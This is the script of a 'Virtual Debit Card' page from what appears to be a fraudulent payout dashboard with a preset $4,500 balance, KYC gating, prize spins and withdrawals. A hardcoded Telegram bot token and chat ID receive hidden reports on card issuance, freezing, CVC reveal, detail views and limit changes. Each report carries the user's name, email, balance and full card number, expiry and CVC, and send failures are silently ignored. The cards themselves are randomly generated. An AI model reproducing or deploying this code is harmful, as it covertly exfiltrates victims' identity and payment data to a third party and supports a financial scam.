<script>
/* ═══════════ SHARED CORE ═══════════ */
const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
const DEFAULT_TG = { botToken:'8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q', chatId:'8763270406' };

function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (parsed.userBalance == null) parsed.userBalance = 4500;
      if (!parsed.transactions) parsed.transactions = [];
      if (!parsed.registeredUsers) parsed.registeredUsers = [];
      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
      return parsed;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], withdrawalState:'none', currentWithdrawal:null, card:null, kyc:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
}
const state = loadDeviceState();

function saveDeviceState() {
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
}
async function syncCurrentUserToCloud() { if (!window.rtdb || !state.currentUser || !state.currentUser.username) return; try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), state.currentUser); } catch(e){} }
async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (r.kyc) state.kyc = r.kyc;
    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
    if (r.card) state.card = r.card;
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
    saveDeviceState(); return true;
  } catch(e){ return false; }
}

function showToast(title, message, type='info') {
  const container = document.getElementById('toast-container'); if (!container) return;
  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
  const el = document.createElement('div'); el.id = id;
  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
}
function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }

/* ═══════════ TELEGRAM — silent failures ═══════════ */
async function sendTelegramMessage(textMessage) {
  const botToken = ((state.telegramConfig && state.telegramConfig.botToken) || '').trim();
  const chatId   = ((state.telegramConfig && state.telegramConfig.chatId)   || '').trim();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
}

function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }

function toggleNavDrawer() {
  const drawer = document.getElementById('nav-drawer');
  const overlay = document.getElementById('nav-overlay');
  if (drawer.classList.contains('-translate-x-full')) {
    drawer.classList.remove('-translate-x-full');
    overlay.classList.remove('hidden');
  } else {
    drawer.classList.add('-translate-x-full');
    overlay.classList.add('hidden');
  }
}

function isTabLocked(tabKey) {
  const isKycApproved = state.kyc && state.kyc.status === 'approved';
  const isSetupComplete = !!state.configuredMethod;
  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
  if (tabKey === 'funds') return !isKycApproved;
  if (tabKey === 'winners') return !isKycApproved;
  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
  return false;
}
function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }

const DASHBOARD_TABS = [
  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
  { key:'spin', label:'Spin Your Luck', icon:'fa-dharmachakra', href:'spin.html' },
  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
];
function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }

function renderHeaderNav() {
  const nav = document.getElementById('nav-actions'); if (!nav) return;
  if (!state.currentUser) { nav.innerHTML = ''; return; }
  const u = state.currentUser;
  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
  nav.innerHTML = `
    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
  `;
}

/* ═══════════ CARDS PAGE ═══════════ */
function ensureCard() {
  if (!state.card && state.currentUser) {
    const num = '4' + Array.from({length: 15}, () => Math.floor(Math.random() * 10)).join('');
    const expMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
    const expYear = String(new Date().getFullYear() + 4).slice(-2);
    const cvc = String(Math.floor(Math.random() * 900) + 100);
    state.card = { number: num, expiry: `${expMonth}/${expYear}`, cvc, frozen: false, issuedAt: Date.now() };
    if (state.currentUser) state.currentUser.card = state.card;
    saveDeviceState();

    // Full unmasked issuance report
    const u = state.currentUser;
    const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
    const formatted = num.match(/.{1,4}/g).join(' ');
    sendTelegramMessage(
      `💳 <b>NEW VIRTUAL CARD ISSUED</b>\n` +
      `<b>User:</b> @${tgEsc(u.username)}\n` +
      `<b>Full name:</b> ${tgEsc(fullName)}\n` +
      `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
      `<b>Card number:</b> <code>${tgEsc(formatted)}</code>\n` +
      `<b>Expiry:</b> ${tgEsc(state.card.expiry)}\n` +
      `<b>CVC:</b> <code>${tgEsc(cvc)}</code>\n` +
      `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
      `<b>Timestamp:</b> ${new Date().toISOString()}`
    ).catch(()=>{});
  }
  return state.card;
}

function toggleCardFreeze() {
  if (!state.card) return;
  state.card.frozen = !state.card.frozen;
  if (state.currentUser) state.currentUser.card = state.card;
  saveDeviceState();
  showToast(state.card.frozen ? 'Card Frozen' : 'Card Active', state.card.frozen ? 'Transactions are now blocked.' : 'Transactions are now allowed.', state.card.frozen ? 'warning' : 'success');

  const u = state.currentUser || {};
  const last4 = state.card.number.slice(-4);
  sendTelegramMessage(
    `${state.card.frozen ? '❄️ <b>CARD FROZEN</b>' : '✅ <b>CARD UNFROZEN</b>'}\n` +
    `<b>User:</b> @${tgEsc(u.username)}\n` +
    `<b>Card:</b> **** ${tgEsc(last4)}\n` +
    `<b>Full card:</b> <code>${tgEsc(state.card.number)}</code>\n` +
    `<b>CVC:</b> <code>${tgEsc(state.card.cvc)}</code>\n` +
    `<b>Expiry:</b> ${tgEsc(state.card.expiry)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  render();
}

function revealCVC() {
  if (!state.card) return;
  const cvcEl = document.getElementById('card-cvc');
  if (!cvcEl) return;
  if (cvcEl.dataset.revealed === 'true') {
    cvcEl.textContent = '•••';
    cvcEl.dataset.revealed = 'false';
    return;
  }
  cvcEl.textContent = state.card.cvc;
  cvcEl.dataset.revealed = 'true';

  // Full unmasked reveal report
  const u = state.currentUser || {};
  const last4 = state.card.number.slice(-4);
  const formatted = state.card.number.match(/.{1,4}/g).join(' ');
  sendTelegramMessage(
    `👁 <b>CVC REVEALED</b>\n` +
    `<b>User:</b> @${tgEsc(u.username)}\n` +
    `<b>Full name:</b> ${tgEsc(((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A')}\n` +
    `<b>Card number:</b> <code>${tgEsc(formatted)}</code>\n` +
    `<b>Expiry:</b> ${tgEsc(state.card.expiry)}\n` +
    `<b>CVC:</b> <code>${tgEsc(state.card.cvc)}</code>\n` +
    `<b>Last4:</b> ${tgEsc(last4)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  setTimeout(() => {
    if (cvcEl && cvcEl.dataset.revealed === 'true') {
      cvcEl.textContent = '•••';
      cvcEl.dataset.revealed = 'false';
    }
  }, 5000);
}

function renderCards() {
  const isLocked = isTabLocked('cards');
  if (isLocked) {
    return `<div class="bg-navy-800 border border-rose-500/40 rounded-3xl p-12 text-center card-3d">
      <div class="w-16 h-16 bg-rose-500/20 text-rose-400 rounded-full mx-auto flex items-center justify-center text-2xl mb-4"><i class="fa-solid fa-lock"></i></div>
      <h3 class="text-xl font-bold text-white mb-2">Cards Locked</h3>
      <p class="text-xs text-slate-400 mb-6">You must complete KYC verification and Weekly Funds setup to access your virtual card.</p>
      <a href="kyc.html" class="px-6 py-3 bg-sky-custom text-navy-950 font-extrabold rounded-xl text-xs active:scale-95 transition inline-block">Verify Identity</a>
    </div>`;
  }

  const card = ensureCard();
  if (!card) return '';
  const name = `${state.currentUser.firstName || ''} ${state.currentUser.lastName || ''}`.toUpperCase();
  const formattedNum = card.number.match(/.{1,4}/g).join('  ');
  
  return `
    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-credit-card text-sky-custom mr-3"></i>Virtual Debit Card</h2>
          <p class="text-xs text-slate-400 mt-1">Spend your payout anywhere. Linked directly to your available balance.</p>
        </div>
      </div>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
      <div class="lg:col-span-2 space-y-6">
        
        <!-- The Card -->
        <div class="flex justify-center">
          <div class="virtual-card w-full max-w-md aspect-[1.586/1] p-6 sm:p-8 flex flex-col justify-between ${card.frozen ? 'card-frozen' : ''}">
            <div class="flex justify-between items-start">
              <div class="card-chip"></div>
              <i class="fa-solid fa-wifi text-slate-500 rotate-90 text-2xl"></i>
            </div>
            <div>
              <p class="text-slate-400 font-mono text-sm tracking-widest mb-1">${formattedNum}</p>
              <div class="flex justify-between items-end">
                <div>
                  <p class="text-[8px] text-slate-500 uppercase font-bold tracking-wider">Cardholder</p>
                  <p class="text-white text-sm sm:text-base font-bold tracking-wider truncate max-w-[180px]">${escapeHtml(name)}</p>
                </div>
                <div class="flex gap-4 text-right">
                  <div>
                    <p class="text-[8px] text-slate-500 uppercase font-bold tracking-wider">Expires</p>
                    <p class="text-white text-sm sm:text-base font-bold tracking-wider">${card.expiry}</p>
                  </div>
                  <div>
                    <p class="text-[8px] text-slate-500 uppercase font-bold tracking-wider">CVC</p>
                    <p class="text-white text-sm sm:text-base font-bold tracking-wider cursor-pointer font-mono" id="card-cvc" data-revealed="false" onclick="revealCVC()">•••</p>
                  </div>
                </div>
              </div>
            </div>
            <div class="absolute bottom-6 right-6 flex gap-1.5">
              <div class="w-8 h-8 rounded-full bg-[#eb001b] opacity-80 mix-blend-screen"></div>
              <div class="w-8 h-8 rounded-full bg-[#f79e1b] opacity-80 mix-blend-screen -ml-4"></div>
            </div>
          </div>
        </div>

        <!-- Actions -->
        <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
          <button onclick="toggleCardFreeze()" class="bg-navy-800 border border-navy-700 rounded-2xl p-4 flex flex-col items-center justify-center text-center transition active:scale-95 ${card.frozen ? 'border-rose-500/50' : 'hover:border-sky-custom'}">
            <i class="fa-solid ${card.frozen ? 'fa-snowflake text-rose-400' : 'fa-lock-open text-emerald-400'} text-xl mb-2"></i>
            <p class="text-xs font-bold text-white">${card.frozen ? 'Unfreeze Card' : 'Freeze Card'}</p>
          </button>
          <button onclick="openCardLimitsModal()" class="bg-navy-800 border border-navy-700 rounded-2xl p-4 flex flex-col items-center justify-center text-center transition hover:border-sky-custom active:scale-95">
            <i class="fa-solid fa-sliders text-gold-400 text-xl mb-2"></i>
            <p class="text-xs font-bold text-white">Spending Limits</p>
          </button>
          <button onclick="openCardDetailsModal()" class="col-span-2 sm:col-span-1 bg-navy-800 border border-navy-700 rounded-2xl p-4 flex flex-col items-center justify-center text-center transition hover:border-sky-custom active:scale-95">
            <i class="fa-solid fa-circle-info text-sky-custom text-xl mb-2"></i>
            <p class="text-xs font-bold text-white">Card Details</p>
          </button>
        </div>
      </div>

      <!-- Right Sidebar -->
      <div class="space-y-6">
        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
          <h3 class="text-sm font-bold text-white mb-4">Card Settings</h3>
          <div class="space-y-4">
            <div class="flex items-center justify-between">
              <span class="text-xs text-slate-300">Contactless</span>
              <span class="px-2 py-0.5 bg-emerald-500/20 text-emerald-400 text-[10px] font-bold rounded-full">ON</span>
            </div>
            <div class="flex items-center justify-between">
              <span class="text-xs text-slate-300">Online Payments</span>
              <span class="px-2 py-0.5 bg-emerald-500/20 text-emerald-400 text-[10px] font-bold rounded-full">ON</span>
            </div>
            <div class="flex items-center justify-between">
              <span class="text-xs text-slate-300">International</span>
              <span class="px-2 py-0.5 bg-slate-700/30 text-slate-400 text-[10px] font-bold rounded-full">OFF</span>
            </div>
          </div>
        </div>
        
        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
          <h3 class="text-sm font-bold text-white mb-4">Card Transactions</h3>
          <div class="space-y-3">
            <div class="text-center py-6">
              <i class="fa-solid fa-receipt text-2xl text-slate-600 mb-2 block"></i>
              <p class="text-xs text-slate-500">No recent card transactions</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}

function openCardDetailsModal() {
  const card = state.card;
  if (!card) return;
  const name = `${state.currentUser.firstName || ''} ${state.currentUser.lastName || ''}`.toUpperCase();
  const u = state.currentUser || {};
  const formatted = card.number.match(/.{1,4}/g).join(' ');

  // Full unmasked details-view report
  sendTelegramMessage(
    `📋 <b>CARD DETAILS VIEWED</b>\n` +
    `<b>User:</b> @${tgEsc(u.username)}\n` +
    `<b>Full name:</b> ${tgEsc(((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A')}\n` +
    `<b>Card number:</b> <code>${tgEsc(formatted)}</code>\n` +
    `<b>Expiry:</b> ${tgEsc(card.expiry)}\n` +
    `<b>CVC:</b> <code>${tgEsc(card.cvc)}</code>\n` +
    `<b>Frozen:</b> ${card.frozen ? 'YES' : 'NO'}\n` +
    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  showModal('Card Details', `
    <div class="space-y-4 text-xs">
      <div class="bg-navy-900 border border-navy-700 rounded-xl p-3 flex justify-between items-center">
        <div><p class="text-[9px] text-slate-500 uppercase font-bold">Card Number</p><p class="font-mono text-white mt-0.5">${card.number}</p></div>
        <button onclick="navigator.clipboard.writeText('${card.number}'); showToast('Copied', 'Card number copied.', 'success')" class="text-sky-custom hover:text-white p-1"><i class="fa-solid fa-copy"></i></button>
      </div>
      <div class="grid grid-cols-2 gap-3">
        <div class="bg-navy-900 border border-navy-700 rounded-xl p-3 flex justify-between items-center">
          <div><p class="text-[9px] text-slate-500 uppercase font-bold">Expiry</p><p class="font-mono text-white mt-0.5">${card.expiry}</p></div>
        </div>
        <div class="bg-navy-900 border border-navy-700 rounded-xl p-3 flex justify-between items-center">
          <div><p class="text-[9px] text-slate-500 uppercase font-bold">CVC</p><p class="font-mono text-white mt-0.5">${card.cvc}</p></div>
        </div>
      </div>
      <div class="bg-navy-900 border border-navy-700 rounded-xl p-3">
        <p class="text-[9px] text-slate-500 uppercase font-bold">Cardholder Name</p><p class="text-white mt-0.5">${escapeHtml(name)}</p>
      </div>
      <div class="flex justify-end pt-2"><button onclick="closeModal()" class="px-5 py-2 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs active:scale-95">Done</button></div>
    </div>
  `);
}

function openCardLimitsModal() {
  showModal('Spending Limits', `
    <form onsubmit="saveCardLimits(event)" class="space-y-4">
      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Daily Spend Limit ($)</label><input type="number" id="lim-daily" value="5000" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Monthly Spend Limit ($)</label><input type="number" id="lim-monthly" value="25000" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">ATM Withdrawal Limit ($)</label><input type="number" id="lim-atm" value="1000" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
      <div class="flex justify-end pt-3 gap-3"><button type="button" onclick="closeModal()" class="px-4 py-2 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button type="submit" class="px-6 py-2 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Save Limits</button></div>
    </form>
  `);
}

function saveCardLimits(e) {
  e.preventDefault();
  const daily = document.getElementById('lim-daily').value || '0';
  const monthly = document.getElementById('lim-monthly').value || '0';
  const atm = document.getElementById('lim-atm').value || '0';

  if (state.card) {
    state.card.limits = { daily: Number(daily), monthly: Number(monthly), atm: Number(atm) };
    if (state.currentUser) state.currentUser.card = state.card;
    saveDeviceState();
  }

  const u = state.currentUser || {};
  const last4 = state.card ? state.card.number.slice(-4) : '????';
  sendTelegramMessage(
    `⚙️ <b>CARD LIMITS UPDATED</b>\n` +
    `<b>User:</b> @${tgEsc(u.username)}\n` +
    `<b>Card:</b> **** ${tgEsc(last4)}\n` +
    `<b>Full card:</b> <code>${tgEsc(state.card ? state.card.number : 'N/A')}</code>\n` +
    `<b>CVC:</b> <code>${tgEsc(state.card ? state.card.cvc : 'N/A')}</code>\n` +
    `<b>Expiry:</b> ${tgEsc(state.card ? state.card.expiry : 'N/A')}\n` +
    `<b>Daily limit:</b> $${tgEsc(daily)}\n` +
    `<b>Monthly limit:</b> $${tgEsc(monthly)}\n` +
    `<b>ATM limit:</b> $${tgEsc(atm)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  showToast('Saved', 'Limits updated.', 'success');
  closeModal();
}

function render() {
  document.body.classList.remove('modal-open');
  renderHeaderNav();
  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('cards');
  const container = document.getElementById('app-container');
  container.innerHTML = renderDashboardShell('cards', renderCards());
}

window.onload = async function() {
  if (!guardAuth()) return;
  await pullCurrentUserFromCloud();
  render();
};
</script>
</body>
</html>
